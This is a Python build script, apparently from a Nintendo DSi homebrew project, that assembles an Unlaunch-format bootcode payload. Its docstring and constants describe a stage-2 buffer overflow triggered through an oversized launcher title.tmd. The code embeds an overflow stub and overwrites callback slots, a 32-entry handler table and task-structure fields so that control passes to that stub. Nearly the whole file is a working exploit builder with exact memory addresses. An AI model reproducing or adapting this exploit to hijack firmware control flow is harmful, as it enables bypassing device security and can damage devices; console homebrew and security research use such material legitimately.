#!/usr/bin/env python3
"""Assemble a Unlaunch-format DSi bootcode payload from OpenLaunch binaries.

The SafeUnlaunch/Unlaunch exploit stores its bootcode as a self-describing
container appended to the backup-launcher (HNAA) ``title.tmd``. Its layout was
decoded from a real retail dump and ``asm/UNLAUNCH.DSI``:

    0x0000  header  (16 KiB)
      0x00   16   stage name, e.g. "UNLAUNCH.DSI" (here "OPENLAUNCH.DSI")
      0x10   u32  0x00030000
      0x1C   u32  0x00000001
      0x20   u32  ARM9 ROM offset   (UNLAUNCH.DSI: 0x4000)
      0x24   u32  ARM9 entry point  (0x02200800)
      0x28   u32  ARM9 load base    (0x02200000)
      0x2C   u32  ARM9 size
      0x30   u32  ARM7 ROM offset   (0xF800)
      0x34   u32  ARM7 entry point  (0x02380000)
      0x38   u32  ARM7 load base    (0x02380000)
      0x3C   u32  ARM7 size
    0x4000  ARM9 binary
    0xF800  ARM7 binary
    ...      padded to the container size

## Placement note

The overflow overwrites stage-2's own data/BSS (RAM ~0x037DF06C..0x037F3C70),
where stage 2 keeps its task/IPC structures. An alternative layout that places
the ARM9/ARM7 images *above* that region (container offsets 0x17000/0x22000) was
tried to keep our code bytes out of those structures, but in melonDS it was not
observed to change the outcome; Unlaunch's offsets are kept for parity.

## The stage-2 overflow entry (see docs/stage2_re.md)

Boot stage 2 loads the launcher title.tmd into the fixed Main-RAM buffer
``0x037DF06C``; an oversized TMD overruns the adjacent stage-2 structures. The
container image is overlaid at ``0x037DF274`` (= buffer + 520, the TMD header).
Stage 2 then executes a function pointer taken from one of these clobbered slots:

    RAM 0x037F3870   (payload offset 0x145FC)   called via blx @ 0x037C8410
    RAM 0x037F3898   (payload offset 0x14624)   called via blx @ 0x037C8428
    RAM 0x037F3B68.. 32-entry handler table (payload offset 0x148F4)

So the builder:
  1. places the ARM9/ARM7 images (as before);
  2. embeds ``--bootstrap`` (the stage-2 overflow stub) at ``--bootstrap-ram``
     (default 0x037F0EC0 = payload offset 0x11C4C, matching Unlaunch);
  3. writes the stub address into the two callback slots and the whole handler
     table, so the overflow transfers control into it.

The stub (src/arm9/overflow_bootstrap.s) reads the header fields above, relocates
the ARM9/ARM7 images to their linked bases and branches to the ARM9 entry.
"""
from __future__ import annotations

import argparse
import os
import struct
import sys

HEADER_SIZE = 0x4000
SIZE_OF_UNLAUNCH = 196088   # payload; TMD = 520 + payload = 196608

# ---- Exploit geometry (must match docs/stage2_re.md) ----------------------
BUF_BASE      = 0x037DF06C   # stage-2 fixed TMD buffer
PAYLOAD_BASE  = 0x037DF274   # buffer + 520 (where the container image loads)
BOOTSTRAP_RAM = 0x037F0EC0   # default stub address (Unlaunch parity)

# Stage-2 callback slots / handler table clobbered by the overflow (RAM).
CALLBACK_SLOTS = (0x037F3870, 0x037F3898)
HANDLER_TABLE_RAM = 0x037F3B68
HANDLER_TABLE_COUNT = 32

# Stage-2 "IPC/task context" words the post-overflow path reads. Found by an
# additive/removal differential against a working payload (see docs/stage2_re.md):
# starting from all-zeros + the IPC handler table, only the four words in payload
# [0x13000,0x13400) are needed for the dispatch to happen - namely 0x037F22C8
# (non-zero; read by 0x037C8880), 0x037F2308, 0x037F232C and 0x037F2330. The
# other entries are harmless parity with the reference layout.
# (RAM address, little-endian u32)
STRUCT_FIELDS = (
    (0x037F3878, 0x037F3890),   # task-list head -> node
    (0x037F3890, 0x037F389C),   # node.current -> next node
    (0x037F389C, 0x00000000),   # node.next = NULL (end of list)
    (0x037F3894, 0x037F22C8),   # secondary context pointer
    (0x037F22C8, 0x000000DF),   # MUST be non-zero: read by 0x037C8880 and tested
    (0x037F2308, 0x037F0EC4),   # context+0x40 -> stub (0x037F0EC0 + 4)
    (0x037F232C, 0x00000001),   # context+0x64 task state
    (0x037F2330, 0x037EEB58),   # context+0x68
    (0x037EEB58, 0x00000000),
    (0x037F39C0, 0x00000001),
    (0x037F39C4, 0x037EEB58),
    (0x037F3900, 0x00000001),
)

# Container header field offsets.
HDR_NAME       = 0x00
HDR_ARM9_OFF   = 0x20
HDR_ARM9_ENTRY = 0x24
HDR_ARM9_BASE  = 0x28
HDR_ARM9_SIZE  = 0x2C
HDR_ARM7_OFF   = 0x30
HDR_ARM7_ENTRY = 0x34
HDR_ARM7_BASE  = 0x38
HDR_ARM7_SIZE  = 0x3C


def _slot_offsets():
    """(payload offset, ) tuples for every pointer we must write."""
    offs = [(a - PAYLOAD_BASE) for a in CALLBACK_SLOTS]
    base = HANDLER_TABLE_RAM - PAYLOAD_BASE
    offs += [base + 4 * i for i in range(HANDLER_TABLE_COUNT)]
    return offs


def build(arm9: bytes, arm7: bytes, *,
          name: bytes = b"OPENLAUNCH.DSI",
          arm9_off: int = 0x4000, arm9_base: int = 0x02200000,
          arm9_entry: int = 0x02200800,
          arm7_off: int = 0xF800, arm7_base: int = 0x02380000,
          arm7_entry: int = 0x02380000,
          bootstrap: bytes = b"", bootstrap_ram: int = BOOTSTRAP_RAM,
          pad_to: int = SIZE_OF_UNLAUNCH) -> bytes:
    if arm9_off < HEADER_SIZE:
        raise SystemExit("arm9 offset must be >= 0x4000")
    if arm9_off + len(arm9) > arm7_off:
        raise SystemExit("ARM9 (%d+0x%X) overlaps ARM7 offset 0x%X"
                         % (arm9_off, len(arm9), arm7_off))
    if arm7_off + len(arm7) > pad_to:
        raise SystemExit("ARM7 (0x%X+0x%X) exceeds container 0x%X"
                         % (arm7_off, len(arm7), pad_to))

    out = bytearray(pad_to)
    out[HDR_NAME:HDR_NAME + 16] = name[:16].ljust(16, b"\x00")
    struct.pack_into("<I", out, 0x10, 0x00030000)
    struct.pack_into("<I", out, 0x1C, 0x00000001)
    struct.pack_into("<I", out, HDR_ARM9_OFF, arm9_off)
    struct.pack_into("<I", out, HDR_ARM9_ENTRY, arm9_entry)
    struct.pack_into("<I", out, HDR_ARM9_BASE, arm9_base)
    struct.pack_into("<I", out, HDR_ARM9_SIZE, len(arm9))
    struct.pack_into("<I", out, HDR_ARM7_OFF, arm7_off)
    struct.pack_into("<I", out, HDR_ARM7_ENTRY, arm7_entry)
    struct.pack_into("<I", out, HDR_ARM7_BASE, arm7_base)
    struct.pack_into("<I", out, HDR_ARM7_SIZE, len(arm7))
    out[arm9_off:arm9_off + len(arm9)] = arm9
    out[arm7_off:arm7_off + len(arm7)] = arm7

    if bootstrap:
        stamp(out, bootstrap, bootstrap_ram)
    return bytes(out)


def stamp(out: bytearray, bootstrap: bytes, bootstrap_ram: int) -> None:
    """Embed the overflow stub and point every clobbered slot at it."""
    off = bootstrap_ram - PAYLOAD_BASE
    if off < HEADER_SIZE:
        raise SystemExit("bootstrap RAM 0x%08X maps below the header "
                         "(payload offset 0x%X)" % (bootstrap_ram, off))
    if off + len(bootstrap) > len(out):
        raise SystemExit("bootstrap (%d bytes) runs past the container"
                         % len(bootstrap))
    out[off:off + len(bootstrap)] = bootstrap

    for o in _slot_offsets():
        if not (0 <= o <= len(out) - 4):
            raise SystemExit("slot payload offset 0x%X outside container" % o)
        struct.pack_into("<I", out, o, bootstrap_ram)

    # stage-2 task-control-block fields the post-overflow path reads.
    for ram, val in STRUCT_FIELDS:
        o = ram - PAYLOAD_BASE
        if not (0 <= o <= len(out) - 4):
            raise SystemExit("struct field payload offset 0x%X outside container" % o)
        struct.pack_into("<I", out, o, val)


def main(argv):
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--arm9", required=True)
    ap.add_argument("--arm7", required=True)
    ap.add_argument("--out", default="build/openlaunch_payload.bin")
    ap.add_argument("--name", default="OPENLAUNCH.DSI")
    ap.add_argument("--arm9-off", type=lambda s: int(s, 0), default=0x4000)
    ap.add_argument("--arm7-off", type=lambda s: int(s, 0), default=0xF800)
    ap.add_argument("--arm9-base", type=lambda s: int(s, 0), default=0x02200000)
    ap.add_argument("--arm9-entry", type=lambda s: int(s, 0), default=0x02200800)
    ap.add_argument("--arm7-base", type=lambda s: int(s, 0), default=0x02380000)
    ap.add_argument("--arm7-entry", type=lambda s: int(s, 0), default=0x02380000)
    ap.add_argument("--pad-to", type=lambda s: int(s, 0), default=SIZE_OF_UNLAUNCH)
    ap.add_argument("--bootstrap", default=None,
                    help="stage-2 overflow stub (build/overflow_bootstrap.bin)")
    ap.add_argument("--bootstrap-ram", type=lambda s: int(s, 0),
                    default=BOOTSTRAP_RAM,
                    help="RAM address the stub runs at (default 0x%08X)"
                         % BOOTSTRAP_RAM)
    args = ap.parse_args(argv)

    with open(args.arm9, "rb") as fh:
        arm9 = fh.read()
    with open(args.arm7, "rb") as fh:
        arm7 = fh.read()

    bootstrap = b""
    if args.bootstrap:
        with open(args.bootstrap, "rb") as fh:
            bootstrap = fh.read()
        if not bootstrap:
            raise SystemExit("bootstrap file %s is empty" % args.bootstrap)

    blob = build(arm9, arm7, name=args.name.encode()[:16],
                 arm9_off=args.arm9_off, arm9_base=args.arm9_base,
                 arm9_entry=args.arm9_entry,
                 arm7_off=args.arm7_off, arm7_base=args.arm7_base,
                 arm7_entry=args.arm7_entry,
                 bootstrap=bootstrap, bootstrap_ram=args.bootstrap_ram,
                 pad_to=args.pad_to)

    os.makedirs(os.path.dirname(os.path.abspath(args.out)), exist_ok=True)
    with open(args.out, "wb") as fh:
        fh.write(blob)
    print("[*] wrote %s (%d bytes)" % (args.out, len(blob)))
    print("    ARM9  off=0x%X entry=0x%08X base=0x%08X size=%d"
          % (args.arm9_off, args.arm9_entry, args.arm9_base, len(arm9)))
    print("    ARM7  off=0x%X entry=0x%08X base=0x%08X size=%d"
          % (args.arm7_off, args.arm7_entry, args.arm7_base, len(arm7)))
    if bootstrap:
        off = args.bootstrap_ram - PAYLOAD_BASE
        print("    overflow stub: %d bytes at RAM 0x%08X (payload+0x%X)"
              % (len(bootstrap), args.bootstrap_ram, off))
        print("    slots armed: 0x%08X, 0x%08X, handler table 0x%08X[%d]"
              % (CALLBACK_SLOTS[0], CALLBACK_SLOTS[1],
                 HANDLER_TABLE_RAM, HANDLER_TABLE_COUNT))
    else:
        print("    [!] no --bootstrap: container is NOT overflow-wired")
    return 0


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
